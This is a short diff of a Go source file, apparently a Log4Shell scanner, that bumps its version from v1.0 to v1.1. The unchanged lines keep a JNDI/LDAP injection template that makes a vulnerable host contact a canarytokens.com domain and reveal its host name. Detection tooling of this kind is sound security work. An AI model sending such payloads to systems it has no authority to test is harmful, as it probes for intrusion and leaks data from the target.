@@ -75,7 +75,7 @@ type (
 )
 
 const (
-	version           = "v1.0"
+	version           = "v1.1"
 	letterBytes       = "abcdefghijklmnopqrstuvwxyz0123456789"
 	maxWorkers        = 100
 	canaryTokenFormat = "${jndi:ldap://x${hostName}.L4J.%s.canarytokens.com/a}"
